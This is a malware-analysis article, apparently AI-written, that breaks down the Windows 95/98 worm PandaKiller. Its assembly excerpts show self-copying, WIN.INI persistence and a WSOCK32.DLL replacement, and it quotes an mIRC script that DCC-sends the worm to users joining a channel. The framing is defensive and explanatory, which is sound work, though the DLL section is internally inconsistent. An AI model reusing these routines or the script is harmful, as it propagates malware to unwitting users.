
### **Analyzing the W95/98.PandaKiller Malware: A Technical Breakdown**

#### **Introduction**

PandaKiller is a Windows 95/98 malware that spreads by self-replicating and modifying system files to ensure persistence. It uses registry manipulation, system file alterations, and a scripting technique to distribute itself via mIRC. In this article, we will analyze the malware's functionality using its assembly code.

----------

### **1. Self-Replication in the Windows Directory**

The malware copies itself to `%windir%\WinExec.exe`, ensuring persistence.

```assembly
push 00000000h
call GetModuleHandleA
push 260
push offset szOrig
push eax
call GetModuleFileNameA  ; Retrieve current executable path

push 260
push offset szCopie
call GetWindowsDirectoryA  ; Get Windows directory

push offset Copie
push offset szCopie
call lstrcat  ; Append "\WinExec.exe" to Windows directory path

push 00000000h
push offset szCopie
push offset szOrig
call CopyFileA  ; Copy the malware to %windir%\WinExec.exe
```

### **2. Modifying WIN.INI for Persistence**

Instead of modifying the registry, PandaKiller modifies `WIN.INI` to execute at startup.

```assembly
push 260
push offset szWin2
call GetWindowsDirectoryA

push offset Winini
push offset szWin2
call lstrcat  ; Append \WIN.INI path

push offset szWin2
push offset szCopie
push offset run
push offset windows
call WritePrivateProfileStringA  ; Write "run=WinExec.exe" under [windows]
```

This method ensures execution at each system startup without altering the registry, which is more detectable.

### **3. System File Modification (WSOCK32.DLL Hijack)**

The malware modifies the `WSOCK32.DLL` file, which handles network communications.

```assembly
push 260
push offset szWsk1
call GetSystemDirectoryA  ; Get system directory path

push 260
push offset szWsk2
call GetSystemDirectoryA

push offset Wsk1
push offset szWsk1
call lstrcat  ; Append "WSOCK32.DLL"

push offset Wsk2
push offset szWsk2
call lstrcat  ; Append "WSOCK32.TPK"

push 00000000h
push offset szWsk2
push offset szWsk1
call CopyFileA  ; Copy WSOCK32.DLL to WSOCK32.TPK
```

To replace the original `WSOCK32.DLL`, the malware modifies `WININIT.INI`:

```assembly
push 260
push offset szWin
call GetWindowsDirectoryA

push offset Wininit
push offset szWin
call lstrcat  ; Construct full path to WININIT.INI

push offset szWin
push offset szWsk1
push offset nul
push offset rename
call WritePrivateProfileStringA  ; Rename original DLL to NULL

push offset szWin
push offset szWsk2
push offset szWsk1
push offset rename
call WritePrivateProfileStringA  ; Replace with infected WSOCK32.TPK
```

### **4. Spreading via mIRC Scripting**

PandaKiller spreads via mIRC by modifying its script files to send itself to users in chat rooms.

```assembly
push 00000000h
push 00000080h
push 00000002h
push 00000000h
push 00000001h
push 40000000h
push offset ini
call CreateFileA  ; Create C:\script.tpk

push 00h
push offset octets
push initaille
push offset inid
push [fh]
call WriteFile  ; Write mIRC script

push [fh]
call CloseHandle
```

The script contents:

```ini
n0=on 1:start:{
n1=.remote on
n2=.ctcps on
n3=.events on
n4=}
n5=on 1:join:#:{
n6= if ( $nick == $me ) { halt } | .dcc send $nick C:\Windows\WinExec.exe
n7=}
```

The malware copies this script into common mIRC installation folders:

```assembly
push 00000000h
push offset script1
push offset ini
call CopyFileA  ; Copy to C:\mirc\script.ini

push 00000000h
push offset script2
push offset ini
call CopyFileA  ; Copy to C:\mirc32\script.ini

push 00000000h
push offset script3
push offset ini
call CopyFileA  ; Copy to C:\program files\mirc\script.ini

push 00000000h
push offset script4
push offset ini
call CopyFileA  ; Copy to C:\program files\mirc32\script.ini

push 00h
push offset ini
call DeleteFileA  ; Delete original script
```

### **5. Payload: Mouse Inversion and Fake Error Message**

The malware causes annoyance by reversing the mouse buttons:

```assembly
push 01h
call SwapMouseButton  ; Swap left and right mouse buttons
```

It also checks the system year and, if 2001, shuts down the computer:

```assembly
push offset SystemTime
call GetSystemTime

cmp  [SystemTime.wYear],7D1h  ; Check if year is 2001
jne  ALERT

push 01h
call ExitWindowsEx  ; Shutdown system
```

If not, it displays a fake Windows error message:

```assembly
push 10h
push offset TITRE
push offset TEXTE
push 0
call MessageBoxA  ; Show "Windows NT required!" message
```

### **Conclusion**

PandaKiller showcases several common malware techniques:

-   **Self-replication** into `WinExec.exe`
    
-   **WIN.INI modification** for stealthy persistence
    
-   **System DLL hijacking** for network interception
    
-   **mIRC script modification** for spreading
    
-   **Mouse inversion and fake error messages** for user disruption
    

By understanding these behaviors, analysts can detect and mitigate similar threats effectively. Defensive measures include monitoring file integrity, restricting script execution, and using up-to-date antivirus solutions.

----------

Would you like additional sections on **detection techniques** or **mitigation strategies**? 🚀
